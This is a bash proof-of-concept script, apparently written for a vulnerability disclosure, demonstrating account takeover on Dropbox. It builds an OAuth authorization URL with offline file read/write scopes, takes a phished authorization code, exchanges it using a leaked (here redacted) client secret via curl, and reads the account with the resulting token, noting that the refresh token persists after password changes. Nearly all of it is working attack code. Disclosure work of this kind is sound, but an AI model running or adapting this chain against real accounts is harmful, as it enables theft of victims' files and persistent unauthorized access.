#!/usr/bin/env bash
# PoC 3 — FULL ATTACK CHAIN: leaked client_secret -> victim account/file takeover.
#
# SAFETY / ETHICS: Run this ONLY against your OWN Dropbox account. It demonstrates the
# complete impact (an attacker who phishes a victim's authorization code exchanges it with
# the leaked secret and gains persistent offline access to the victim's files). Using your
# own account proves the chain end-to-end WITHOUT involving any real third-party victim.
set -euo pipefail

CID="REDACTED_PROD_CLIENT_KEY"
CSECRET="REDACTED_PROD_CLIENT_SECRET"
REDIRECT="https://www.dash.ai/oauth"   # registered redirect (confirmed accepted)

AUTH_URL="https://www.dropbox.com/oauth2/authorize?client_id=${CID}&response_type=code&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$REDIRECT'))")&token_access_type=offline&scope=files.content.read+files.content.write+openid+email+profile+account_info.read"

echo "[1] Open this URL in a browser logged into YOUR OWN Dropbox account and click Allow:"
echo
echo "    $AUTH_URL"
echo
echo "[2] You are redirected to ${REDIRECT}?code=XXXX  (a real attacker phishes this code)."
read -rp "    Paste the code value here: " CODE

echo
echo "[3] Attacker exchanges the code using the LEAKED secret (no attacker app registration needed):"
RESP=$(curl -s -X POST "https://api.dropboxapi.com/oauth2/token" \
  -d "grant_type=authorization_code" -d "code=${CODE}" \
  -d "client_id=${CID}" -d "client_secret=${CSECRET}" -d "redirect_uri=${REDIRECT}")
echo "    $RESP"

ACCESS=$(python3 -c "import json,sys;print(json.loads(sys.argv[1]).get('access_token',''))" "$RESP")
[ -z "$ACCESS" ] && { echo "No access token — code may have expired (60s TTL). Re-run."; exit 1; }

echo
echo "[4] Proof of account takeover — read the victim's (your) account with the stolen token:"
curl -s -X POST "https://api.dropboxapi.com/2/users/get_current_account" \
  -H "Authorization: Bearer ${ACCESS}" | python3 -m json.tool
echo
echo "    A refresh_token in step 3 = PERSISTENT access even after the user changes password."
